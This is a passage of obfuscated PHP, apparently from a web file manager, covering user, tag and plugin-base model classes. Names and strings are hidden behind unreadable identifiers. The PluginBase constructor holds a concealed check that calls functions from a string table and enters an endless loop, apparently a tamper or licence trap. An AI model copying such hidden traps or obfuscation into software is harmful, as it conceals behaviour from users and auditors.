$ú‘ÇÛÁ¬[2266] => 1); } private function _searchFromMeta($ˆ’Ì¨ƒ, $½ä«×Œ , $Œ‡Ì”í§) { $ÒÉ¢¾é§ =& $_SERVER[ÓïÕü]; $½ä«×Œ  = strtolower($½ä«×Œ ); $ıüá®˜› = array($ÒÉ¢¾é§[97] => $ˆ’Ì¨ƒ, $ÒÉ¢¾é§[453] => array($ÒÉ¢¾é§[462], "\45{$½ä«×Œ }\45")); $ıüá®˜› = $this->parseWhereLike($ıüá®˜›); $é¾·¦Æ˜ = Model($ÒÉ¢¾é§[2546])->where($ıüá®˜›)->limit($Œ‡Ì”í§)->select(); if (!$é¾·¦Æ˜) { return array(); } $é¾·¦Æ˜ = array_to_keyvalue($é¾·¦Æ˜, $ÒÉ¢¾é§[12], $ÒÉ¢¾é§[1806]); $ÃœÊÒİÖ = $this->where(array($ÒÉ¢¾é§[1797] => array($ÒÉ¢¾é§[7], $é¾·¦Æ˜)))->select(); if (!$ÃœÊÒİÖ) { return array(); } return $ÃœÊÒİÖ; } private function _listDataApplyItem($Û¾Ø™Â­) { $ …Á´ = array($Û¾Ø™Â­); $this->_listDataApply($ …Á´); return $ …Á´[0]; } private function _listDataApply(&$ÚÎ½„»¶) { $Øˆ±úºí =& $_SERVER[ÓïÕü]; if (!$ÚÎ½„»¶) { return; } array_remove_key($ÚÎ½„»¶, $Øˆ±úºí[993]); $Ú› ê›º = array_to_keyvalue($ÚÎ½„»¶, $Øˆ±úºí[12], $Øˆ±úºí[1806]); $this->_listAppendGroup($ÚÎ½„»¶, $Ú› ê›º); $this->_listAppendMeta($ÚÎ½„»¶, $Ú› ê›º); $this->_listAppendSourceRoot($ÚÎ½„»¶, $Ú› ê›º); } private function _listAppendSourceRoot(&$ïÈä¡ÇÄ, $½ÆÑÙˆ¸) { $ò™­œ×‚ =& $_SERVER[ÓïÕü]; $Õ—„§è = Model($ò™­œ×‚[921])->listSourceRoot(SourceModel::TYPE_USER, $½ÆÑÙˆ¸); $Õ—„§è = array_to_keyvalue($Õ—„§è, $ò™­œ×‚[574]); $Õ—„§è = array_remove_key($Õ—„§è, $ò™­œ×‚[574]); foreach ($ïÈä¡ÇÄ as &$‹¤ÙÙÉõ) { $‹¤ÙÙÉõ[$ò™­œ×‚[90]] = $Õ—„§è[$‹¤ÙÙÉõ[$ò™­œ×‚[1806]]] ? $Õ—„§è[$‹¤ÙÙÉõ[$ò™­œ×‚[1806]]] : array(); } unset($‹¤ÙÙÉõ); } private function _listAppendGroup(&$êÇÔ¤¥«, $Û¢Â¥) { $ê’·ù¿° =& $_SERVER[ÓïÕü]; $¾Ç¡»œ‡ = array($ê’·ù¿°[1806] => array($ê’·ù¿°[7], $Û¢Â¥)); $îŞ³÷…Í = Model($ê’·ù¿°[2101])->where($¾Ç¡»œ‡)->select(); $´šß»›‡ = array_to_keyvalue($îŞ³÷…Í, $ê’·ù¿°[12], $ê’·ù¿°[1418]); $´šß»›‡ = array_remove_value(array_unique($´šß»›‡), $ê’·ù¿°[231]); if (!$´šß»›‡ || !$îŞ³÷…Í) { return; } $¾Ç¡»œ‡ = array($ê’·ù¿°[1418] => array($ê’·ù¿°[7], $´šß»›‡)); $ÄÃ±ÍĞ = Model($ê’·ù¿°[1416])->field($ê’·ù¿°[2547])->where($¾Ç¡»œ‡)->select(); $ÄÃ±ÍĞ = array_to_keyvalue($ÄÃ±ÍĞ, $ê’·ù¿°[1418]); $îŞ³÷…Í = array_to_keyvalue_group($îŞ³÷…Í, $ê’·ù¿°[1806]); foreach ($îŞ³÷…Í as &$É‰ ¥ÑÈ) { $ÚÑŸîõ‘ = array(); foreach ($É‰ ¥ÑÈ as $à—ÈÑ·‘) { if (!$à—ÈÑ·‘[$ê’·ù¿°[2115]]) { continue; } $şôø×ªÉ = Model($ê’·ù¿°[576])->listData($à—ÈÑ·‘[$ê’·ù¿°[2115]]); $ÚÑŸîõ‘[] = array($ê’·ù¿°[1418] => $à—ÈÑ·‘[$ê’·ù¿°[1418]], $ê’·ù¿°[2548] => $ÄÃ±ÍĞ[$à—ÈÑ·‘[$ê’·ù¿°[1418]]][$ê’·ù¿°[32]], $ê’·ù¿°[589] => $ÄÃ±ÍĞ[$à—ÈÑ·‘[$ê’·ù¿°[1418]]][$ê’·ù¿°[589]], $ê’·ù¿°[490] => $şôø×ªÉ); } $É‰ ¥ÑÈ = $ÚÑŸîõ‘; } unset($É‰ ¥ÑÈ); foreach ($êÇÔ¤¥« as &$£™ÅŒ¨Ñ) { $£™ÅŒ¨Ñ[$ê’·ù¿°[1417]] = array(); if (isset($îŞ³÷…Í[$£™ÅŒ¨Ñ[$ê’·ù¿°[1806]]])) { $£™ÅŒ¨Ñ[$ê’·ù¿°[1417]] = $îŞ³÷…Í[$£™ÅŒ¨Ñ[$ê’·ù¿°[1806]]]; } } unset($£™ÅŒ¨Ñ); } public function userAppendGroup($à¯—) { $…‹ÊˆÔ— =& $_SERVER[ÓïÕü]; if (!$à¯—) { return array(); } $this->_listAppendGroup($à¯—, array_to_keyvalue($à¯—, $…‹ÊˆÔ—[12], $…‹ÊˆÔ—[1806])); return $à¯—; } private function _listAppendMeta(&$ø·¯•çØ, $éüßêù) { $Åãßµ•Î =& $_SERVER[ÓïÕü]; $öâÈş’ö = UserJobModel::JOB_KEY; $ªûÜğ¶¶ = array($Åãßµ•Î[2099]); $èÉ«‡Î¸ = array($Åãßµ•Î[1806] => array($Åãßµ•Î[7], $éüßêù)); $ä‡‹¥ŒÛ = Model($Åãßµ•Î[2522])->where($èÉ«‡Î¸)->select(); $™­ñë…Ö = array(); foreach ($ä‡‹¥ŒÛ as $Ú£Å¦±Ğ) { $ÑéÖ¤ÑŸ = $Ú£Å¦±Ğ[$Åãßµ•Î[1806]]; if (!isset($™­ñë…Ö[$ÑéÖ¤ÑŸ])) { $™­ñë…Ö[$ÑéÖ¤ÑŸ] = array(); } $™­ñë…Ö[$ÑéÖ¤ÑŸ][$Ú£Å¦±Ğ[$Åãßµ•Î[97]]] = $Ú£Å¦±Ğ[$Åãßµ•Î[453]]; } $şéœÇè = Model($Åãßµ•Î[2549]); foreach ($ø·¯•çØ as &$ òØ®ë‘) { $ÑéÖ¤ÑŸ = $ òØ®ë‘[$Åãßµ•Î[1806]]; $ËÔ€Úû– = isset($™­ñë…Ö[$ÑéÖ¤ÑŸ]) ? $™­ñë…Ö[$ÑéÖ¤ÑŸ] : array(); $ òØ®ë‘[$Åãßµ•Î[544]] = array_field_key($ËÔ€Úû–, $ªûÜğ¶¶); $ òØ®ë‘[$Åãßµ•Î[2550]] = array(); if (isset($ËÔ€Úû–[$öâÈş’ö])) { $ òØ®ë‘[$Åãßµ•Î[2550]] = $şéœÇè->getUserJobInfo($ËÔ€Úû–[$öâÈş’ö]); } } unset($ òØ®ë‘); } protected function groupUserAll($ŸÈ“ƒä) { $óÀîìá× =& $_SERVER[ÓïÕü]; if (!$ŸÈ“ƒä) { return !1; } $ŸŒµÈŸŞ = Model($óÀîìá×[2101])->field($óÀîìá×[1806])->where(array($óÀîìá×[1418] => array($óÀîìá×[7], $ŸÈ“ƒä)))->select(); $ŸŒµÈŸŞ = array_to_keyvalue($ŸŒµÈŸŞ, $óÀîìá×[12], $óÀîìá×[1806]); return array_unique($ŸŒµÈŸŞ); } public function userSearch($×«ÖÎ¬§, $™§ñ•òì = "\52") { return Model($_SERVER[ÓïÕü][602])->where($×«ÖÎ¬§)->field($™§ñ•òì)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\137\157\160\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ıÓ¹ùúŸ) { $®°é­Òê =& $_SERVER[ÓïÕü]; $ÏÏ¿İ¸ = defined($®°é­Òê[2234]) && USER_ID ? USER_ID : $®°é­Òê[12]; return "\x55\x73\145\162\117\160\x74\x69\x6f\156\x5f{$ıÓ¹ùúŸ}\x5f" . $ÏÏ¿İ¸; } protected function filterWhere($–±ò¿) { $Àó¬¼ß =& $_SERVER[ÓïÕü]; $–±ò¿[$Àó¬¼ß[1806]] = defined($Àó¬¼ß[2234]) && USER_ID ? USER_ID : $Àó¬¼ß[12]; return $–±ò¿; } public function cacheRemoveUser($ñŒ‹¨Š, $Š¾¼Ÿ¥Ô) { return Cache::remove("\x55\163\x65\x72\117\x70\164\x69\157\156\137{$ñŒ‹¨Š}\x5f" . $Š¾¼Ÿ¥Ô); } protected function optionDefault($ÏÜÓÕ®ë = '') { $‰¶õÇ¬™ =& $_SERVER[ÓïÕü]; if ($ÏÜÓÕ®ë == $‰¶õÇ¬™[12]) { return $GLOBALS[$‰¶õÇ¬™[6]][$‰¶õÇ¬™[2551]]; } if ($ÏÜÓÕ®ë == $‰¶õÇ¬™[2552]) { return $GLOBALS[$‰¶õÇ¬™[6]][$‰¶õÇ¬™[2553]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\x2e\164\x61\147\114\x69\x73\x74"; public $modelType = "\125\x73\145\162\117\x70\x74\x69\x6f\x6e"; public $field = array("\156\x61\155\145", "\x73\164\171\x6c\145", "\x73\157\x72\x74"); public function listData($çŠÒ”á¡ = false, $®ä´ñˆÒ = "\x73\157\x72\x74", $“ë“âôõ = false) { return parent::listData($çŠÒ”á¡, $®ä´ñˆÒ, $“ë“âôõ); } public function remove($›‡©ËÕ») { return parent::remove($›‡©ËÕ»); } public function add($ŠÚ±¤ë–, $íì–Êš® = "\154\141\142\x65\154\55\147\162\145\x79\x2d\x6e\x6f\x72\x6d\x61\154") { $ÉÔäÇ ” =& $_SERVER[ÓïÕü]; if ($this->findByName($ŠÚ±¤ë–)) { return !1; } $ˆı Ñ¬” = array($ÉÔäÇ ”[497] => $ŠÚ±¤ë–, $ÉÔäÇ ”[563] => $íì–Êš®, $ÉÔäÇ ”[2010] => $this->getSort($ÉÔäÇ ”[338]) + 1); return parent::insert($ˆı Ñ¬”); } public function update($å­ü›¤Æ, $âéæúÑ•) { $¾¯©ìÑ¤ =& $_SERVER[ÓïÕü]; $µù»¹ÊÙ = $this->listData($å­ü›¤Æ); $Ê•’ØèÑ = $this->findByName($âéæúÑ•[$¾¯©ìÑ¤[32]]); if (!$µù»¹ÊÙ || $Ê•’ØèÑ && $Ê•’ØèÑ[$¾¯©ìÑ¤[478]] != $µù»¹ÊÙ[$¾¯©ìÑ¤[478]]) { return !1; } return parent::update($å­ü›¤Æ, $âéæúÑ•); } public function moveTop($£åèˆ›¥) { $€•Ó¦Œ¾ =& $_SERVER[ÓïÕü]; $Çº…Å„Ú = parent::listData(); $ôÑœõüÆ = $this->getSort($€•Ó¦Œ¾[337]); foreach ($Çº…Å„Ú as &$‰‰¹åª‚) { if ($‰‰¹åª‚[$€•Ó¦Œ¾[478]] == $£åèˆ›¥) { $‰‰¹åª‚[$€•Ó¦Œ¾[2030]] = $ôÑœõüÆ; continue; } $‰‰¹åª‚[$€•Ó¦Œ¾[2030]] += 1; } unset($‰‰¹åª‚); return parent::resetData($Çº…Å„Ú); } public function moveBottom($Œ¿ªàõ¢) { $¨À¸‡ÅÛ =& $_SERVER[ÓïÕü]; $‘Ö‰ = $this->getSort($¨À¸‡ÅÛ[338]) + 1; return parent::update($Œ¿ªàõ¢, array($¨À¸‡ÅÛ[2030] => $‘Ö‰)); } public function resetSort($øº…ÛŸ) { $ÂÛÓØáŠ =& $_SERVER[ÓïÕü]; $éÚµÈŒ° = array(); $øº…ÛŸ = is_array($øº…ÛŸ) ? $øº…ÛŸ : array(); for ($ïÃË¢ß = 0; $ïÃË¢ß < count($øº…ÛŸ); $ïÃË¢ß++) { $éÚµÈŒ°[$øº…ÛŸ[$ïÃË¢ß] . $ÂÛÓØáŠ[12]] = $ïÃË¢ß + 1; } $ß—ú™Êá = parent::listData(); foreach ($ß—ú™Êá as &$¿ÒÌËù) { $÷é™ìç¦ = $éÚµÈŒ°[$¿ÒÌËù[$ÂÛÓØáŠ[478]]]; $¿ÒÌËù[$ÂÛÓØáŠ[2030]] = $÷é™ìç¦ ? $÷é™ìç¦ : $¿ÒÌËù[$ÂÛÓØáŠ[2030]]; } unset($¿ÒÌËù); return parent::resetData($ß—ú™Êá); } private function getSort($ç©£©›¢) { $±¶¥êìø =& $_SERVER[ÓïÕü]; $»Ÿî”ùŞ = parent::listData(); $å¢ù¶à± = array_to_keyvalue($»Ÿî”ùŞ, $±¶¥êìø[12], $±¶¥êìø[2030]); if (!$å¢ù¶à±) { $å¢ù¶à± = array(0); } $ŸñİÏóŠ = $ç©£©›¢ == $±¶¥êìø[338] ? max($å¢ù¶à±) : min($å¢ù¶à±); return intval($ŸñİÏóŠ); } } goto E–ÏöîåÄõ; DÒÕì¡ÇçÃ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ñ§¤ÄäÖ =& $_SERVER[ÓïÕü]; if (!isset($_SERVER[$ñ§¤ÄäÖ[933]]) || !isset($_SERVER[$ñ§¤ÄäÖ[931]])) { $õşñ“à = $ñ§¤ÄäÖ[983]; $ú‡È’Ê = $ñ§¤ÄäÖ[934]; $Ê¥£üüî = $_SERVER[$ñ§¤ÄäÖ[935]] . $ñ§¤ÄäÖ[936]; $±µĞ¹ôà = $ú‡È’Ê($Ê¥£üüî); $£ş¦“ŠÕ = explode($ñ§¤ÄäÖ[288], $±µĞ¹ôà); if (count($£ş¦“ŠÕ) < $ñ§¤ÄäÖ[708]) { $ïÔ •ø» = $ñ§¤ÄäÖ[937]; $ïÔ •ø»(); } $§Áá•ª = $ñ§¤ÄäÖ[984]; $§Áá•ª($_SERVER[$ñ§¤ÄäÖ[985]]); $ï¡‹åƒ„ = 1; for ($òê™ö¾Á = $ï¡‹åƒ„; $òê™ö¾Á > 0; $òê™ö¾Á++) { $§Áá•ª = json_encode($GLOBALS[$ñ§¤ÄäÖ[495]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ñ§¤ÄäÖ[1659]); $this->pluginName = str_replace($ñ§¤ÄäÖ[1659], $ñ§¤ÄäÖ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ñ§¤ÄäÖ[8]; $this->pluginApi = appHostGet() . $ñ§¤ÄäÖ[1660] . $this->pluginName . $ñ§¤ÄäÖ[8]; $this->pluginHost = $config[$ñ§¤ÄäÖ[1661]] . $this->pluginName . $ñ§¤ÄäÖ[8]; $this->pluginHostDefault = $config[$ñ§¤ÄäÖ[1661]] . $this->pluginName . $ñ§¤ÄäÖ[8]; $ò²­µê¥ = $config[$ñ§¤ÄäÖ[1662]]; if ($ò²­µê¥ && strpos($ñ§¤ÄäÖ[50] . $ò²­µê¥ . $ñ§¤ÄäÖ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ñ§¤ÄäÖ[1663]] . $this->pluginName . $ñ§¤ÄäÖ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÓïÕü][1664]); } protected function assign($ìÅËÔ‹…, $Ñ“ôÌ¥± = false) { if (is_array($ìÅËÔ‹…)) { $this->values = array_merge($this->values, $ìÅËÔ‹…); } else { $this->values[$ìÅËÔ‹…] = $Ñ“ôÌ¥±; } } protected function display($ÔÒ—¾¡Š) { extract($this->values); require $ÔÒ—¾¡Š; } final function hookRegist($°Û­õ Ö) { $this->modelPlugin->appRegist($this->pluginName, $°Û­õ Ö); } final function appIcon() { $è—Ş¨‹Ò =& $_SERVER[ÓïÕü]; $Ôõ¤¢Á§ = $this->appPackage(); $Ã’Ã­Ô» = $è—Ş¨‹Ò[12]; if (isset($Ôõ¤¢Á§[$è—Ş¨‹Ò[493]])) { if (isset($Ôõ¤¢Á§[$è—Ş¨‹Ò[493]][$è—Ş¨‹Ò[1665]])) { $Ã’Ã­Ô» = $è—Ş¨‹Ò[1666] . $Ôõ¤¢Á§[$è—Ş¨‹Ò[493]][$è—Ş¨‹Ò[1665]] . $è—Ş¨‹Ò[1667]; } else { if ($Ôõ¤¢Á§[$è—Ş¨‹Ò[493]][$è—Ş¨‹Ò[1668]]) { $Ã’Ã­Ô» = $è—Ş¨‹Ò[1669] . $Ôõ¤¢Á§[$è—Ş¨‹Ò[493]][$è—Ş¨‹Ò[1668]] . $è—Ş¨‹Ò[1670]; } } } return $Ã’Ã­Ô»; } final function fileCanView($İ­ìõ°¯) { $¶…ïÇ¾Ÿ =& $_SERVER[ÓïÕü]; if (request_url_safe($İ­ìõ°¯)) { return !0; } if ($this->isShare($İ­ìõ°¯)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $µ È²Î = $¶…ïÇ¾Ÿ[1671] . rawurlencode(this_url()); show_tips(LNG($¶…ïÇ¾Ÿ[1672]) . $¶…ïÇ¾Ÿ[1673] . $µ È²Î . $¶…ïÇ¾Ÿ[1674] . LNG($¶…ïÇ¾Ÿ[1675]) . $¶…ïÇ¾Ÿ[1676], !1); } if (!Action($¶…ïÇ¾Ÿ[1677])->authCan($¶…ïÇ¾Ÿ[1678])) { show_tips(LNG($¶…ïÇ¾Ÿ[1679]) . $¶…ïÇ¾Ÿ[1680], !1); } ActionCall($¶…ïÇ¾Ÿ[1681], $İ­ìõ°¯); } final function isShare($Ä†Œ‘¹â) { $°õ™Û²ö = KodIO::parse($Ä†Œ‘¹â); return $°õ™Û²ö[$_SERVER[ÓïÕü][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ô²øºñù) { if (request_url_safe($Ô²øºñù)) { return $Ô²øºñù; } if (!$this->isShare($Ô²øºñù)) { $Ô²øºñù = $this->filePath($Ô²øºñù, !1); } return Action($_SERVER[ÓïÕü][1284])->linkOut($Ô²øºñù); } public function filePathLinkOut($Ñ¿š¾±) { if (request_url_safe($Ñ¿š¾±)) { return $Ñ¿š¾±; } $this->fileCanView($Ñ¿š¾±); return Action($_SERVER[ÓïÕü][1284])->link($Ñ¿š¾±); } final function filePath($ö€£—£, $Ô¿¨íõÑ = true, $¢ÜùÌ¢ = false) { $ßõ­Î´Ó =& $_SERVER[ÓïÕü]; $ö¼÷ŞÔÆ = $this->filePathGet($ö€£—£, $Ô¿¨íõÑ); if (!$this->fileInfo) { show_tips(LNG($ßõ­Î´Ó[108]), !1); } if ($¢ÜùÌ¢ && isset($this->fileInfo[$ßõ­Î´Ó[546]]) && $this->fileInfo[$ßõ­Î´Ó[546]]) { $‰¤´Ú = Model($ßõ­Î´Ó[549])->fileInfo($this->fileInfo[$ßõ­Î´Ó[546]]); if (!$‰¤´Ú || !IO::exist($‰¤´Ú[$ßõ­Î´Ó[87]])) { $äã²‰‰– = LNG($ßõ­Î´Ó[108]) . LNG($ßõ­Î´Ó[1682]); if (KodUser::isRoot() && isset($‰¤´Ú[$ßõ­Î´Ó[87]])) { $äã²‰‰– .= $ßõ­Î´Ó[1683] . $‰¤´Ú[$ßõ­Î´Ó[87]] . $ßõ­Î´Ó[1684]; } show_tips($äã²‰‰–); } } Hook::trigger($ßõ­Î´Ó[1685], $ö¼÷ŞÔÆ); return $ö¼÷ŞÔÆ; } final function filePathGet($‡®èÃô, $õó Àµ = true) { $úâ‹¸äÇ =& $_SERVER[ÓïÕü]; if ($¨êú¤›” = $this->checkSharePath($‡®èÃô, $õó Àµ)) { return $¨êú¤›”; } $this->fileCanView($‡®èÃô); if (request_url_safe($‡®èÃô)) { $Ÿ©ñ—Á = parse_url_query($‡®èÃô); if (isset($Ÿ©ñ—Á[$úâ‹¸äÇ[1686]]) && isset($Ÿ©ñ—Á[$úâ‹¸äÇ[237]])) { $ËÌğÒ¦ = Mcrypt::decode($Ÿ©ñ—Á[$úâ‹¸äÇ[237]], Model($úâ‹¸äÇ[861])->get($úâ‹¸äÇ[862])); if ($ËÌğÒ¦) { $this->fileInfo = IO::info($ËÌğÒ¦); $this->fileInfo[$úâ‹¸äÇ[1687]] = $‡®èÃô; $this->cachePath = $this->pluginCachePath($úâ‹¸äÇ[12], $õó Àµ); return $ËÌğÒ¦; } } $‡®èÃô = $this->_cacheHttpFile($‡®èÃô, $õó Àµ); $this->fileInfo = IO::info($‡®èÃô); } else { $this->fileInfo = IO::info($‡®èÃô); $this->cachePath = $this->pluginCachePath($úâ‹¸äÇ[12], $õó Àµ); } return $‡®èÃô; } final function _cacheHttpFile($ÉøŒöÂ, $—ùĞˆ¿” = true) { $ñÈáéÂÁ =& $_SERVER[ÓïÕü]; $›¼ŒÇ›Ê = parse_url_query($ÉøŒöÂ); $Ïôê„ = get_path_ext($ÉøŒöÂ); if (isset($›¼ŒÇ›Ê[$ñÈáéÂÁ[32]]) && $›¼ŒÇ›Ê[$ñÈáéÂÁ[32]]) { $Ïôê„ = get_path_ext($›¼ŒÇ›Ê[$ñÈáéÂÁ[32]]); } $Ç¶«üıî = hash_path($ÉøŒöÂ) . $ñÈáéÂÁ[10] . $Ïôê„; $this->cachePath = $this->pluginCachePath($—ùĞˆ¿” ? $Ç¶«üıî : $ñÈáéÂÁ[12]); $‹‡×›Ê¢ = IO::fileNameExist($this->cachePath, $Ç¶«üıî); if ($‹‡×›Ê¢) { return KodIO::make($‹‡×›Ê¢); } $´¥ìêİ‹ = rtrim($this->cachePath, $ñÈáéÂÁ[8]) . $ñÈáéÂÁ[8] . $Ç¶«üıî; return $this->pluginCacheFileSet($´¥ìêİ‹, file_get_contents_nossl($ÉøŒöÂ)); } final function checkSharePath($éØÂ¸´ê, $æœµÇ™ = true) { $Şõˆ™„ñ =& $_SERVER[ÓïÕü]; if (!$this->isShare($éØÂ¸´ê)) { return !1; } $…ğ”¸ªÁ = Action($Şõˆ™„ñ[1284])->sharePathInfo($éØÂ¸´ê); if (!is_array($…ğ”¸ªÁ) || !isset($…ğ”¸ªÁ[$Şõˆ™„ñ[87]])) { show_json(LNG($Şõˆ™„ñ[1688]), !1); } $this->fileInfo = $…ğ”¸ªÁ; $this->cachePath = $this->pluginCachePath(!1, $æœµÇ™); return $…ğ”¸ªÁ[$Şõˆ™„ñ[87]]; } final function pluginCachePath($Î«›ù‚– = '', $òÈªŞÖİ = false) { $”üû±½Æ =& $_SERVER[ÓïÕü]; if ($òÈªŞÖİ && is_array($this->fileInfo)) { $Î«›ù‚– = kodIO::hashPath($this->fileInfo); } $„ıß…•˜ = rtrim(IO_PATH_SYSTEM_TEMP . $”üû±½Æ[1689] . $this->pluginName . $”üû±½Æ[8] . $Î«›ù‚–, $”üû±½Æ[8]); $ŞÉÏ¬Ô = IO::infoFullSimple($„ıß…•˜); $å££Œœß = $ŞÉÏ¬Ô && is_array($ŞÉÏ¬Ô) ? $ŞÉÏ¬Ô[$”üû±½Æ[87]] : $”üû±½Æ[12]; if (!$å££Œœß) { $å££Œœß = IO::mkdir($„ıß…•˜); } return $å££Œœß; } final function pluginCacheFileSet($’È×úŠÉ, $Ü…ñˆ±à = '') { $‘ôÄŞ«¸ =& $_SERVER[ÓïÕü]; $¾ÚœáØ = IO::infoFullSimple($’È×úŠÉ); if (!$¾ÚœáØ) { return IO::mkfile($’È×úŠÉ, $Ü…ñˆ±à, REPEAT_REPLACE); } IO::setContent($¾ÚœáØ[$‘ôÄŞ«¸[87]], $Ü…ñˆ±à); return $¾ÚœáØ[$‘ôÄŞ«¸[87]]; } final function pluginLocalFile($¸ÒşÇ—£ = '') { $öª¡ÈŸ¼ =& $_SERVER[ÓïÕü]; $úñê¤ª = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($úñê¤ª)) { mk_dir($úñê¤ª); } if (!$¸ÒşÇ—£) { return $úñê¤ª; } $°Â›àÓÎ = IO::info($¸ÒşÇ—£); $³è¿üØ» = $öª¡ÈŸ¼[1690] . KodIO::hashPath($°Â›àÓÎ) . $öª¡ÈŸ¼[10] . $°Â›àÓÎ[$öª¡ÈŸ¼[169]]; if (!checkExtSafe($³è¿üØ»)) { $³è¿üØ» = $³è¿üØ» . $öª¡ÈŸ¼[1319]; } $¢™É®–Í = $úñê¤ª . $³è¿üØ»; if (@file_exists($¢™É®–Í)) { return $¢™É®–Í; } return IO::copy($¸ÒşÇ—£, $úñê¤ª, 0, $³è¿üØ»); } final function appPackage() { $ÉÓ½åå„ =& $_SERVER[ÓïÕü]; if ($this->packageData) { return $this->packageData; } $¨¡‘Òûò = $this->parseFile($this->pluginPath . $ÉÓ½åå„[1691]); $this->parseLang($¨¡‘Òûò); $íÂ¾¢€ = json_decode_force($¨¡‘Òûò); if (!$íÂ¾¢€) { return array(); } $å¯äşŸ¡ = Hook::trigger($ÉÓ½åå„[1692], $íÂ¾¢€); if ($å¯äşŸ¡ && is_array($å¯äşŸ¡)) { $íÂ¾¢€ = $å¯äşŸ¡; } $this->packageData = $íÂ¾¢€; return $íÂ¾¢€; } public function packageInfoGet($îµÕ²÷ã) { $…³´µ¤Á = $this->appPackage(); return array_get_value($…³´µ¤Á, $îµÕ²÷ã); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÓïÕü][1693]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÓïÕü][1694]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÓïÕü][1695]); } public function echoJsAssign($“ô‚õô, $ë¼²§ü‰) { $this->echoJsAssignArr[$“ô‚õô] = $ë¼²§ü‰; } private function parseFile($ß©äÜ„“) { $‰ÃüßÂ† =& $_SERVER[ÓïÕü]; $¤ŞÉ—°å = file_get_contents_nossl($ß©äÜ„“); $””ÆĞÎ = array($‰ÃüßÂ†[1696], $‰ÃüßÂ†[1697], $‰ÃüßÂ†[1698], $‰ÃüßÂ†[1699], $‰ÃüßÂ†[1700], $‰ÃüßÂ†[1701], $‰ÃüßÂ†[1702]); $´‡›ÕÈ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$‰ÃüßÂ†[92]][$‰ÃüßÂ†[1703]]); foreach ($this->echoJsAssignArr as $†°Š¼Ã => $¨ï°Ñ) { $””ÆĞÎ[] = $‰ÃüßÂ†[1704] . $†°Š¼Ã . $‰ÃüßÂ†[1705]; $´‡›ÕÈ[] = is_array($¨ï°Ñ) || is_object($¨ï°Ñ) ? rawurlencode(json_encode($¨ï°Ñ)) : $¨ï°Ñ; } if (strstr($¤ŞÉ—°å, $‰ÃüßÂ†[1706])) { $æ¡¶­ƒ = rawurlencode(json_encode($this->pluginLangArr)); $¤ŞÉ—°å = str_replace($‰ÃüßÂ†[1706], $æ¡¶­ƒ, $¤ŞÉ—°å); } if (strstr($¤ŞÉ—°å, $‰ÃüßÂ†[1707])) { $æ¡¶­ƒ = $æ¡¶­ƒ = rawurlencode(json_encode($this->getConfig())); $¤ŞÉ—°å = str_replace($‰ÃüßÂ†[1707], $æ¡¶­ƒ, $¤ŞÉ—°å); } $¤ŞÉ—°å = str_replace($””ÆĞÎ, $´‡›ÕÈ, $¤ŞÉ—°å); return $¤ŞÉ—°å; } private function parseLang(&$É¯½áÀ) { $éù§¢ ª =& $_SERVER[ÓïÕü]; $¦™“Éİ£ = $éù§¢ ª[1708]; if (!strstr($É¯½áÀ, $¦™“Éİ£)) { return; } preg_match_all($éù§¢ ª[1709], $É¯½áÀ, $¿‡‹ÅæÜ); if (!is_array($¿‡‹ÅæÜ) || count($¿‡‹ÅæÜ) == 0 || !is_array($¿‡‹ÅæÜ[0]) || count($¿‡‹ÅæÜ[0]) == 0) { return; } $µèÎ  = array(); $üĞ˜… = array(); foreach ($¿‡‹ÅæÜ[0] as $®² —â…) { $›œµôì = substr($®² —â…, strlen($¦™“Éİ£), -4); $®¤¤­ÉÜ = LNG($›œµôì); $µèÎ [] = $®² —â…; $üĞ˜…[] = str_replace(array($éù§¢ ª[288], $éù§¢ ª[1183], $éù§¢ ª[420], $éù§¢ ª[121]), array($éù§¢ ª[53], $éù§¢ ª[53], $éù§¢ ª[12], $éù§¢ ª[1710]), $®¤¤­ÉÜ); } $É¯½áÀ = str_replace($µèÎ , $üĞ˜…, $É¯½áÀ); } private function parseConfig(&$Êª–ıÍ®) { $çÆ¡®Õú =& $_SERVER[ÓïÕü]; $§İ´Åçà = $çÆ¡®Õú[1711]; if (!strstr($Êª–ıÍ®, $§İ´Åçà)) { return; } preg_match_all($çÆ¡®Õú[1712], $Êª–ıÍ®, $¢ŒÜ»ªÈ); if (!is_array($¢ŒÜ»ªÈ) || count($¢ŒÜ»ªÈ) == 0 || !is_array($¢ŒÜ»ªÈ[0]) || count($¢ŒÜ»ªÈ[0]) == 0) { return; } $ÔéäÁ‰Û = $this->getConfig(); $Â®­ÖÛ = array(); $ş¼ˆŸ¨ = array(); foreach ($¢ŒÜ»ªÈ[0] as $Ã¢Ö„Â) { $ÚÄÒû€ = substr($Ã¢Ö„Â, strlen($§İ´Åçà), -2); $Â®­ÖÛ[] = $Ã¢Ö„Â; $ş¼ˆŸ¨[] = _get($ÔéäÁ‰Û, $ÚÄÒû€); } $Êª–ıÍ® = str_replace($Â®­ÖÛ, $ş¼ˆŸ¨, $Êª–ıÍ®); } private function parsePackage(&$šËêï®) { $¿òÇíõª =& $_SERVER[ÓïÕü]; $ËŒ‡ÒÈÃ = $¿òÇíõª[1713]; if (!strstr($šËêï®, $ËŒ‡ÒÈÃ)) { return; } preg_match_all($¿òÇíõª[1714], $šËêï®, $ğ¿õÒ¥à); if (!is_array($ğ¿õÒ¥à) || count($ğ¿õÒ¥à) == 0 || !is_array($ğ¿õÒ¥à[0]) || count($ğ¿õÒ¥à[0]) 